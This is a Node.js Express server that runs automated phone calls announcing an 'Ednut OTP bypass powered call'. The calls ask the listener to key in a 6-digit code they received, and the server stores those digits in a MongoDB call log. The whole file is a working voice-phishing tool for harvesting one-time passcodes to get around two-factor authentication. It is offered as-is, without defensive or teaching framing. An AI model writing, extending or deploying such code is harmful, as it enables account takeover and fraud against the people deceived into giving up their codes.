// Filename: server.js

const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const Promise = require('bluebird');
const config = require('./config');
const CallLog = require('../models/CallLog'); // Import the CallLog model

mongoose.Promise = Promise;

if (!config.MONGO_URL) {
  throw new Error('MONGO_URL env variable not set.');
}

mongoose.connect(config.MONGO_URL, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log('MongoDB connected...'))
  .catch(err => console.log(err));

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// GET /answer route to handle the incoming call and provide NCCO actions
app.get('/answer', (req, res) => {
  let from = req.query.from;
  let to = req.query.to;
  let conferenceId = req.query.conference_id;

  const ncco = [
    {
      action: 'talk',
      voiceName: 'Jennifer',
      text: 'Welcome to Ednut OTP bypass powered call, ' + conferenceId.substr(-4),
      language: 'en-US',
      style: 2,
      bargeIn: false
    },
    {
      action: 'talk',
      text: 'Please enter the 6-digit code you received, followed by the hash key.',
      language: 'en-US',
      style: 2,
      bargeIn: true
    },
    {
      action: 'input',
      type: ['dtmf'],
      dtmf: {
        maxDigits: 6,
        submitOnHash: true,
        timeOut: 20
      }
    },
    {
      action: 'talk',
      text: 'Thanks for your input, goodbye.',
      language: 'en-US',
      style: 2
    }
  ];

  res.json(ncco);
});

// POST /event route to handle DTMF input and log it to the console
app.post('/event', async (req, res) => {
  if (req.body.dtmf) {
    const digits = req.body.dtmf.digits;
    const conferenceId = req.body.conversation_uuid; // Assuming this is how you identify the call

    console.log(`User input received: ${digits}`);

    try {
      // Find the call log by conferenceId and update it with the DTMF input
      await CallLog.findOneAndUpdate(
        { conferenceId },
        { $push: { dtmfInput: digits } }
      );
      console.log(`DTMF input ${digits} saved to call log with conferenceId ${conferenceId}`);
    } catch (err) {
      console.error('Error updating call log with DTMF input:', err);
    }
  } else {
    console.log('Event received:', req.body);
  }
  res.status(204).end();
});

// Start the server
const server = app.listen(process.env.PORT || 4001, () => {
  console.log('Express server listening on port %d in %s mode', server.address().port, app.settings.env);
});